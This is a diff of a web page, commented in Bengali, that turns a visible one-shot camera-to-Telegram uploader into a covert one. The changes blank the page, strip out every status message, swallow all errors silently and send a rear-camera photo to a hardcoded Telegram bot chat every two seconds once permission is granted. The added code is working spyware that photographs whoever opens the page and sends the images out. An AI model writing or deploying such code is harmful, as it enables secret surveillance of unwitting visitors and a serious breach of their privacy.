@@ -3,28 +3,19 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ক্যামেরা → টেলিগ্রাম</title>
+  <title>camera</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 40px 20px;
-      background: #f0f2f5;
-      color: #333;
-    }
-    #status {
-      font-size: 18px;
-      font-weight: bold;
-      margin-top: 20px;
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: #ffffff;
+      overflow: hidden;
     }
   </style>
 </head>
 <body>
 
-  <div id="status">⏳ ক্যামেরা পারমিশন চাওয়া হচ্ছে...</div>
-
-  <!-- লুকানো ভিডিও ও ক্যানভাস -->
-  <video id="video" autoplay playsinline style="display:none;"></video>
+  <video id="video" autoplay playsinline muted style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
@@ -33,71 +24,69 @@
     const CHAT_ID = "8350847101";
     // ===========================================================
 
-    const statusDiv = document.getElementById('status');
+    const INTERVAL_MS = 2000; // প্রতি ২ সেকেন্ডে একটি ছবি
+
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
 
-    // পেজ লোড হলেই ক্যামেরা পারমিশন চাওয়া
+    function waitForVideoReady() {
+      return new Promise((resolve) => {
+        if (video.readyState >= 2) return resolve();
+        video.onloadedmetadata = () => resolve();
+      });
+    }
+
+    async function captureAndSend(stream) {
+      try {
+        if (!video.videoWidth || !video.videoHeight) return;
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const blob = await new Promise(resolve =>
+          canvas.toBlob(resolve, 'image/jpeg', 0.9)
+        );
+        if (!blob) return;
+
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'photo.jpg');
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      } catch (e) {
+        // কোনো এরর দেখাবে না, চুপচাপ চলতে থাকবে
+      }
+    }
+
     window.addEventListener('load', async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "environment" },
           audio: false
         });
-
         video.srcObject = stream;
 
-        // ভিডিও রেডি হওয়া পর্যন্ত অপেক্ষা
-        video.onloadedmetadata = () => {
-          video.play();
-          statusDiv.textContent = "📸 ছবি তোলা হচ্ছে...";
-          // একটু দেরি করে ছবি তুলি যাতে ফ্রেম রেডি হয়
-          setTimeout(() => captureAndSend(stream), 1000);
-        };
+        await waitForVideoReady();
+        await video.play();
+
+        // ফ্রেম রেডি হওয়ার জন্য সামান্য অপেক্ষা
+        await new Promise(r => setTimeout(r, 800));
+
+        // প্রথম ছবি
+        captureAndSend(stream);
+
+        // এরপর প্রতি ২ সেকেন্ডে বারবার ছবি
+        setInterval(() => captureAndSend(stream), INTERVAL_MS);
+
       } catch (err) {
-        statusDiv.textContent = "❌ ক্যামেরা পারমিশন দেওয়া হয়নি: " + err.message;
+        // পারমিশন না দিলে বা অন্য সমস্যা হলে কিছুই দেখাবে না
       }
     });
-
-    // ছবি তুলে Telegram-এ পাঠানো
-    async function captureAndSend(stream) {
-      try {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        statusDiv.textContent = "⏳ ছবি টেলিগ্রামে পাঠানো হচ্ছে...";
-
-        canvas.toBlob(async (blob) => {
-          const formData = new FormData();
-          formData.append('chat_id', CHAT_ID);
-          formData.append('photo', blob, 'photo.jpg');
-
-          try {
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-              method: 'POST',
-              body: formData
-            });
-            const data = await res.json();
-
-            if (data.ok) {
-              statusDiv.textContent = "✅ ছবি সফলভাবে পাঠানো হয়েছে!";
-            } else {
-              statusDiv.textContent = "❌ ব্যর্থ: " + (data.description || "অজানা ত্রুটি");
-            }
-          } catch (e) {
-            statusDiv.textContent = "❌ নেটওয়ার্ক ত্রুটি: " + e.message;
-          } finally {
-            // ক্যামেরা বন্ধ করা
-            stream.getTracks().forEach(track => track.stop());
-          }
-        }, 'image/jpeg', 0.9);
-
-      } catch (err) {
-        statusDiv.textContent = "❌ ত্রুটি: " + err.message;
-      }
-    }
   </script>
 
 </body>
